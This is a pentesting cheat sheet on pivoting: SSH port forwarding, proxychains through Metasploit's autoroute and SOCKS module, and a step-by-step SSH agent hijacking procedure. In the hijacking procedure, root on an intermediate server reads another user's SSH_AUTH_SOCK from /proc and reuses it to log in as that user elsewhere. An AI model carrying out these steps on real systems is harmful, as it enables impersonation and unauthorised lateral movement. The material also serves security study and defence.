# Pivot

**Port forwarding**

* Local port forwarding: `ssh -L <LOCALPORT>:<TARGET>:<TARGETPORT> <PIVOT>` will allow you to interact with `<TARGET>` from your local device through the `<PIVOT>` device.
  * Local port forwarding can also be used to attack from your device a service exposed locally on the target (eg: databases)
* Dynamix port forwarding: `ssh -D 127.0.0.1:<LOCALPORT> <USER>@<TARGET>` will create a SOCKS proxy. Any traffic sent to this port is sent to its destination through the SSH server.
  * To use this server you can do `proxychains <COMMAND> <PARAMETERS>`.
    * Set `<LOCALPORT>` in `/etc/proxychains.conf`

**Proxychains**

This tool force any TCP connection made by any application to follow through a given proxy. You can launch tools like nmap, mysql ... with proxychains through a SOCKS server launch through `SSH` or `metasploit`.

* From a Meterpreter session do `run autoroute -s <IP>` to add a new route, then use `run autoroute -p` to display it. Do `background` to be able to access Metasploit module, then `use auxiliary/server/socks4a` en `run` it.
* From your shell you are now able to do `proxychains <COMMAND> <PARAMETERS>` (update `/etc/proxychains.conf` if necessary).
  * Proxychains will look for `/etc/proxychains.conf` in the current folder firstly, then you can launch a `proxychains` by folder.

**SSH Agent Hijacking**

ssh-agent load a decrypted copy of the private key into the memory on the local workstation. It also provides a local socket that the SSH client can use to ask it to decrypt the encrypted message sent back by the remote server. The private key stays safely ensconced in the ssh-agent process memory while still allowing you to SSH around without typing in passwords

Sometimes you need to chain SSH sessions. Using `ForwardAgent` in your local SSH configuration will allow you to SSH to device\_1 using public key authentifcation then SSH will tunneling your connection and allowing you to authenticate with public key on device\_2 from device\_1 without leave your private key on device\_1.

Enabled "ForwardAgent" -> SSH uses its built-in tunneling capabilities to create another socket on the intermediate server that is tunneled back to the ssh-agent socket on the local workstation.

Problem, anyone with root privilege on the intermediate server can use your ssh-agent to authenticate to other servers. Even if the keys are not installed on the intermediate server, the ssh client programs is able to access the agent running on my local machine

SSH\_AUTH\_SOCK -> Path to the socket ssh-add : Let us view/interact with keys in the agent

Enven if the keys are NOT installed in the intermediate server, the SSH client is able to access the agent running on the local workstation

Locally :

* `env|grep SSH_AUTH_SOCK`
* `ls -l /tmp/launch-<RANDOM>/Listeners`
* ssh-add program lets us view and interact with keys in the agent : `ssh-add -l`
* Configuration on in the \~/.ssh/config : `ForwardAgent yes`

Intermediate server :

* `env|grep SSH_AUTH_SOCK`
* ssh-add program lets us view and interact with keys in the agent : `ssh-add -l`
* Check connected user : `who`
* Go to root :`sudo -s`
* find the child process of one of his ssh sessions, grab its PID : `pstree -p <TARGET>`
* Look the valie of SSH\_AUTH\_SOCK : `cat /proc/<PID>/environ`
* `SSH_AUTH_SOCK=/tmp/ssh-<RANDOM>/agent.16816 ssh-add -l`
* `SSH_AUTH_SOCK=/tmp/ssh-<RANDOM>/agent.16816 ssh <TARGET-USER>@<TARGET-DEVICE>`
* Source : [https://www.clockwork.com/news/2012/09/28/602/ssh\\\_agent\\\_hijacking/](https://www.clockwork.com/news/2012/09/28/602/ssh/\_agent/\_hijacking/)
